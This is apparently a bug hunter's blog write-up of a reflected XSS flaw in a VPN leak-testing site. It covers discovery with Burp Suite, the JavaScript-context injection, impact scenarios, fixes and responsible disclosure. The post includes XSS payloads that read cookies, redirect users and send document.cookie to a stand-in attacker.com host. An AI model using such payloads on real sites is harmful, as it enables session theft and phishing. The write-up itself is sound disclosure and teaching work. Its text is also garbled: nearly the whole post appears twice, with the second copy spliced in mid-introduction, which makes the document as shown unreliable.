# When the Privacy Tool Has a Privacy Problem: Finding My First XSS Vulnerability

*How a routine security check turned into an eye-opening discovery*

---

I wasn't looking for vulnerabilities that day. I was just checking if my VPN was leaking DNS queries—something I do probably twice a month. I'd used this particular service dozens of times before. Click the button, wait for results, confirm everything looks good, close the tab.

But that day, something felt different. Maybe it was because I'd been studying XSS vulnerabilities for the past week. Maybe it was the way the page rendered. Whatever it was, my brain flagged something: *"That looks like user input being reflected back."*# When the Privacy Tool Has a Privacy Problem: Finding My First XSS Vulnerability

*How a routine security check turned into an eye-opening discovery*

---

I wasn't looking for vulnerabilities that day. I was just checking if my VPN was leaking DNS queries—something I do probably twice a month. I'd used this particular service dozens of times before. Click the button, wait for results, confirm everything looks good, close the tab.

But that day, something felt different. Maybe it was because I'd been studying XSS vulnerabilities for the past week. Maybe it was the way the page rendered. Whatever it was, my brain flagged something: *"That looks like user input being reflected back."*

I couldn't let it go.

## The Moment of Suspicion

After clicking the test button, I noticed the test type appearing in the page—not just as plain text, but embedded in a way that made me wonder: *is this being validated at all?*

The more I stared at it, the more something felt off. It's like when you've been to a place a hundred times and suddenly notice a door you never saw before. How had I missed this?

So I did what any curious security researcher would do. I opened Burp Suite.

## Down the Rabbit Hole

I intercepted the POST request and there it was—a parameter in the request body with what looked like the test option I had selected. Clean, simple, innocent-looking.

But here's the thing about web security: the most innocent-looking parameters are often the most dangerous.

I started with something basic. I tried injecting a simple XSS payload:
```
<script>alert(1)</script>
```

I forwarded the request and watched the response.

Nothing. The angle brackets were probably being filtered.

But then I remembered—sometimes encoding is your best friend. I URL-encoded parts of the payload and tried various combinations.
<img width="1913" height="973" alt="4 - Copy" src="https://github.com/user-attachments/assets/3ae3c9ee-2e69-48db-bc70-879242f98b31" />


Then it happened. The page loaded, and there it was: a JavaScript alert box, bright as day, displaying my cookies.
<img width="1900" height="1011" alt="5" src="https://github.com/user-attachments/assets/ee402699-0534-423b-8036-b163100e2fc6" />


My heart rate kicked up. Not from excitement—from the realization of what this meant.

## Why This Hit Different

Here's what made this discovery particularly concerning: this wasn't just some random website. This is a *privacy tool*. People visit it specifically because they're concerned about their online privacy. They're checking if their VPN is working, if their ISP can see their traffic, if they're leaving digital footprints.

And yet, a Reflected XSS vulnerability meant that:

- **Session cookies could be stolen** through a crafted URL
- **Users could be redirected** to malicious sites that look identical to the real one
- **Test results could be manipulated** to show false information, giving users a false sense of security or unnecessary panic
- **Phishing attacks could be launched** leveraging the trust users place in the domain

The vulnerability existed because the application was taking user input from the POST request body and reflecting it directly into a JavaScript variable without proper escaping or sanitization.

## Breaking It Down: What Actually Happened

Let me walk you through exactly how this worked, because understanding the mechanics is what makes this click.

**Normal Behavior:**
When you click the test button, the browser sends a POST request with your selected option:
```
POST /endpoint
Content-Type: application/x-www-form-urlencoded

parameter=selected_value
```

The server takes that input and embeds it in the page:
```javascript
<script>
    window.variableName = "selected_value";
    // ... rest of the code
</script>
```

Seems fine, right? The problem is there's no validation that the input is actually one of the expected values.

**The Attack:**
By injecting a payload like:
```
value";alert(document.cookie);//
```

The server would generate:
```javascript
<script>
    window.variableName = "value";alert(document.cookie);//";
    // everything after // is now a comment
</script>
```

And just like that—arbitrary JavaScript execution in the victim's browser.

## Seeing is Believing

I tested this multiple times to confirm. Each time, the alert box would pop up showing the cookies. I could see session tracking cookies that an attacker could exfiltrate to their own server.

But I didn't stop at `alert()`. I needed to understand the full scope:

```javascript
// Could I redirect users?
payload";window.location='http://attacker.com';//

// Could I manipulate the DOM?
payload";document.body.innerHTML='<h1>Fake Results</h1>';//

// Could I steal data silently?
payload";fetch('http://attacker.com/steal?data='+document.cookie);//
```

All of them worked.

## The Real-World Impact

Let's talk about what this actually means for regular users.

**Scenario 1: The Privacy Activist**

Imagine you're a journalist or activist who relies on VPNs for protection. You receive an email: "Your VPN may be compromised—test it here." The link looks legitimate (same domain you always use), but it contains an XSS payload.

You click it. You run your test. Everything looks normal.

But in the background, JavaScript has just sent your real IP address and DNS information to an attacker's server. The very thing you were trying to protect has just been leaked through a tool meant to *detect* leaks.

**Scenario 2: The Trust Exploitation**

Someone posts on a privacy subreddit: "I tested 10 different VPNs—here are my results [link]."

The link contains a payload that modifies the DOM to show fake results. Suddenly, VPN Provider A looks terrible while VPN Provider B (the attacker's choice) looks perfect. Users make decisions based on manipulated data.

**Scenario 3: The Silent Cookie Harvest**

An attacker creates a legitimate-looking blog post: "How to properly test your VPN setup." It includes step-by-step instructions and a "test your VPN here" link.

The blog post goes viral. Thousands of privacy-conscious users click the link. Each one silently sends their session cookies to an attacker-controlled server. The attacker builds a database of user testing patterns, IP addresses, and behaviors.

None of these victims would ever know they'd been compromised.

## What Should Have Been Different?

The fix isn't complicated. In fact, it's straightforward:

**1. Input Validation**: The parameter should only accept whitelisted values. Only the expected options should be allowed—anything else should be rejected immediately.

```javascript
const allowedValues = ['option_1', 'option_2'];
if (!allowedValues.includes(userInput)) {
    return error;
}
```

**2. Output Encoding**: Before reflecting *any* user input into a JavaScript context, escape special characters. Quotes, brackets, semicolons—all need to be properly encoded.

**3. Content Security Policy**: Implement a strict CSP that prevents inline script execution. Even if something slips through, CSP acts as a safety net.

**4. HttpOnly Cookies**: Mark session cookies as HttpOnly so JavaScript can't access them at all.

These aren't advanced security measures. They're basics. And they would have completely prevented this vulnerability.

## The Disclosure Process

After confirming the vulnerability, I did what any responsible security researcher should do:

I documented everything:
- The vulnerable endpoint
- The vulnerable parameter  
- Step-by-step reproduction instructions
- Multiple proof-of-concept payloads
- Impact assessment
- Recommended fixes

Then I drafted a formal disclosure report and sent it to the site operators on January 7, 2026.

Now I wait. Responsible disclosure means giving the team time to fix the issue before going public with specifics. It's not about glory—it's about protecting users.

## What I Learned

This was my first real Reflected XSS discovery, and it taught me more than any tutorial ever could.

**1. Trust your instincts.** That nagging feeling I had about the page rendering wasn't random. It was pattern recognition. When something feels off, investigate.

**2. The most trusted tools can have vulnerabilities.** A site designed to protect privacy had a vulnerability that could compromise it. Nothing is immune. Question everything.

**3. Encoding is your friend.** My first payload failed because angle brackets were filtered. URL encoding got around that. Sometimes the solution is trying the same thing in a different format.

**4. Impact isn't always about passwords.** Even without traditional user accounts, being able to manipulate results or steal session data is significant—especially for a privacy tool.

**5. Context matters.** XSS in a JavaScript context requires different thinking than XSS in an HTML context. Understanding *where* your input lands is crucial.

**6. Responsible disclosure is non-negotiable.** Finding vulnerabilities is exciting. But the real measure of a security researcher isn't what you find—it's how you handle it.

## The Bigger Picture

Here's what really stuck with me: security isn't just about protecting data or preventing breaches. It's about trust.

People use privacy tools because they're worried. They're concerned about surveillance, about data leaks, about their digital footprint. When they use these tools, they're seeking reassurance that their protections are actually working.

A vulnerability like this breaks that trust. Not maliciously, not intentionally, but it breaks it nonetheless.

And that's why this matters. Not because it's a critical severity bug. Not because it could lead to massive data breaches. But because it represents a broken promise to users who are already vulnerable and seeking protection.

## Final Thoughts

I wasn't looking for a vulnerability that day. I was just doing a routine check like I'd done dozens of times before. But curiosity—that little voice that said "wait, that doesn't look right"—led me down a path I didn't expect.

That's what makes web security fascinating. Vulnerabilities don't announce themselves. They hide in parameters, in reflections, in the tiny moments where user input meets server output without proper validation.

The next time you're using a web application and something feels slightly off? Don't ignore it. Open your dev tools. Intercept that request. You might just find something interesting.

And when you do, handle it responsibly. Because at the end of the day, we're all just trying to make the internet a little bit safer for everyone.

---

*This writeup discusses a vulnerability reported through responsible disclosure on January 7, 2026. All identifying details have been redacted until the issue is resolved. This post is for educational purposes only.*

*Want to discuss web security or bug hunting? Connect with me on LinkedIn or check out my GitHub for more research.*

---

**Key Takeaways:**
- Always validate and sanitize user input before reflection
- Context-aware output encoding is critical for XSS prevention
- Even trusted security tools can have vulnerabilities
- Responsible disclosure protects users while giving vendors time to fix issues
- Trust your instincts when something feels off—it usually is

I couldn't let it go.

## The Moment of Suspicion

After clicking the test button, I noticed the test type appearing in the page—not just as plain text, but embedded in a way that made me wonder: *is this being validated at all?*

The more I stared at it, the more something felt off. It's like when you've been to a place a hundred times and suddenly notice a door you never saw before. How had I missed this?

So I did what any curious security researcher would do. I opened Burp Suite.

## Down the Rabbit Hole

I intercepted the POST request and there it was—a parameter in the request body with what looked like the test option I had selected. Clean, simple, innocent-looking.

But here's the thing about web security: the most innocent-looking parameters are often the most dangerous.

I started with something basic. I tried injecting a simple XSS payload:
```
<script>alert(1)</script>
```

I forwarded the request and watched the response.

Nothing. The angle brackets were probably being filtered.

But then I remembered—sometimes encoding is your best friend. I URL-encoded parts of the payload and tried various combinations.

Then it happened. The page loaded, and there it was: a JavaScript alert box, bright as day, displaying my cookies.

My heart rate kicked up. Not from excitement—from the realization of what this meant.

## Why This Hit Different

Here's what made this discovery particularly concerning: this wasn't just some random website. This is a *privacy tool*. People visit it specifically because they're concerned about their online privacy. They're checking if their VPN is working, if their ISP can see their traffic, if they're leaving digital footprints.

And yet, a Reflected XSS vulnerability meant that:

- **Session cookies could be stolen** through a crafted URL
- **Users could be redirected** to malicious sites that look identical to the real one
- **Test results could be manipulated** to show false information, giving users a false sense of security or unnecessary panic
- **Phishing attacks could be launched** leveraging the trust users place in the domain

The vulnerability existed because the application was taking user input from the POST request body and reflecting it directly into a JavaScript variable without proper escaping or sanitization.

## Breaking It Down: What Actually Happened

Let me walk you through exactly how this worked, because understanding the mechanics is what makes this click.

**Normal Behavior:**
When you click the test button, the browser sends a POST request with your selected option:
```
POST /endpoint
Content-Type: application/x-www-form-urlencoded

parameter=selected_value
```

The server takes that input and embeds it in the page:
```javascript
<script>
    window.variableName = "selected_value";
    // ... rest of the code
</script>
```

Seems fine, right? The problem is there's no validation that the input is actually one of the expected values.

**The Attack:**
By injecting a payload like:
```
value";alert(document.cookie);//
```

The server would generate:
```javascript
<script>
    window.variableName = "value";alert(document.cookie);//";
    // everything after // is now a comment
</script>
```

And just like that—arbitrary JavaScript execution in the victim's browser.

## Seeing is Believing

I tested this multiple times to confirm. Each time, the alert box would pop up showing the cookies. I could see session tracking cookies that an attacker could exfiltrate to their own server.

But I didn't stop at `alert()`. I needed to understand the full scope:

```javascript
// Could I redirect users?
payload";window.location='http://attacker.com';//

// Could I manipulate the DOM?
payload";document.body.innerHTML='<h1>Fake Results</h1>';//

// Could I steal data silently?
payload";fetch('http://attacker.com/steal?data='+document.cookie);//
```

All of them worked.

## The Real-World Impact

Let's talk about what this actually means for regular users.

**Scenario 1: The Privacy Activist**

Imagine you're a journalist or activist who relies on VPNs for protection. You receive an email: "Your VPN may be compromised—test it here." The link looks legitimate (same domain you always use), but it contains an XSS payload.

You click it. You run your test. Everything looks normal.

But in the background, JavaScript has just sent your real IP address and DNS information to an attacker's server. The very thing you were trying to protect has just been leaked through a tool meant to *detect* leaks.

**Scenario 2: The Trust Exploitation**

Someone posts on a privacy subreddit: "I tested 10 different VPNs—here are my results [link]."

The link contains a payload that modifies the DOM to show fake results. Suddenly, VPN Provider A looks terrible while VPN Provider B (the attacker's choice) looks perfect. Users make decisions based on manipulated data.

**Scenario 3: The Silent Cookie Harvest**

An attacker creates a legitimate-looking blog post: "How to properly test your VPN setup." It includes step-by-step instructions and a "test your VPN here" link.

The blog post goes viral. Thousands of privacy-conscious users click the link. Each one silently sends their session cookies to an attacker-controlled server. The attacker builds a database of user testing patterns, IP addresses, and behaviors.

None of these victims would ever know they'd been compromised.

## What Should Have Been Different?

The fix isn't complicated. In fact, it's straightforward:

**1. Input Validation**: The parameter should only accept whitelisted values. Only the expected options should be allowed—anything else should be rejected immediately.

```javascript
const allowedValues = ['option_1', 'option_2'];
if (!allowedValues.includes(userInput)) {
    return error;
}
```

**2. Output Encoding**: Before reflecting *any* user input into a JavaScript context, escape special characters. Quotes, brackets, semicolons—all need to be properly encoded.

**3. Content Security Policy**: Implement a strict CSP that prevents inline script execution. Even if something slips through, CSP acts as a safety net.

**4. HttpOnly Cookies**: Mark session cookies as HttpOnly so JavaScript can't access them at all.

These aren't advanced security measures. They're basics. And they would have completely prevented this vulnerability.

## The Disclosure Process

After confirming the vulnerability, I did what any responsible security researcher should do:

I documented everything:
- The vulnerable endpoint
- The vulnerable parameter  
- Step-by-step reproduction instructions
- Multiple proof-of-concept payloads
- Impact assessment
- Recommended fixes

Then I drafted a formal disclosure report and sent it to the site operators on January 7, 2026.

Now I wait. Responsible disclosure means giving the team time to fix the issue before going public with specifics. It's not about glory—it's about protecting users.

## What I Learned

This was my first real Reflected XSS discovery, and it taught me more than any tutorial ever could.

**1. Trust your instincts.** That nagging feeling I had about the page rendering wasn't random. It was pattern recognition. When something feels off, investigate.

**2. The most trusted tools can have vulnerabilities.** A site designed to protect privacy had a vulnerability that could compromise it. Nothing is immune. Question everything.

**3. Encoding is your friend.** My first payload failed because angle brackets were filtered. URL encoding got around that. Sometimes the solution is trying the same thing in a different format.

**4. Impact isn't always about passwords.** Even without traditional user accounts, being able to manipulate results or steal session data is significant—especially for a privacy tool.

**5. Context matters.** XSS in a JavaScript context requires different thinking than XSS in an HTML context. Understanding *where* your input lands is crucial.

**6. Responsible disclosure is non-negotiable.** Finding vulnerabilities is exciting. But the real measure of a security researcher isn't what you find—it's how you handle it.

## The Bigger Picture

Here's what really stuck with me: security isn't just about protecting data or preventing breaches. It's about trust.

People use privacy tools because they're worried. They're concerned about surveillance, about data leaks, about their digital footprint. When they use these tools, they're seeking reassurance that their protections are actually working.

A vulnerability like this breaks that trust. Not maliciously, not intentionally, but it breaks it nonetheless.

And that's why this matters. Not because it's a critical severity bug. Not because it could lead to massive data breaches. But because it represents a broken promise to users who are already vulnerable and seeking protection.

## Final Thoughts

I wasn't looking for a vulnerability that day. I was just doing a routine check like I'd done dozens of times before. But curiosity—that little voice that said "wait, that doesn't look right"—led me down a path I didn't expect.

That's what makes web security fascinating. Vulnerabilities don't announce themselves. They hide in parameters, in reflections, in the tiny moments where user input meets server output without proper validation.

The next time you're using a web application and something feels slightly off? Don't ignore it. Open your dev tools. Intercept that request. You might just find something interesting.

And when you do, handle it responsibly. Because at the end of the day, we're all just trying to make the internet a little bit safer for everyone.

---

*This writeup discusses a vulnerability reported through responsible disclosure on January 7, 2026. All identifying details have been redacted until the issue is resolved. This post is for educational purposes only.*

*Want to discuss web security or bug hunting? Connect with me on LinkedIn or check out my GitHub for more research.*

---

**Key Takeaways:**
- Always validate and sanitize user input before reflection
- Context-aware output encoding is critical for XSS prevention
- Even trusted security tools can have vulnerabilities
- Responsible disclosure protects users while giving vendors time to fix issues
- Trust your instincts when something feels off—it usually is
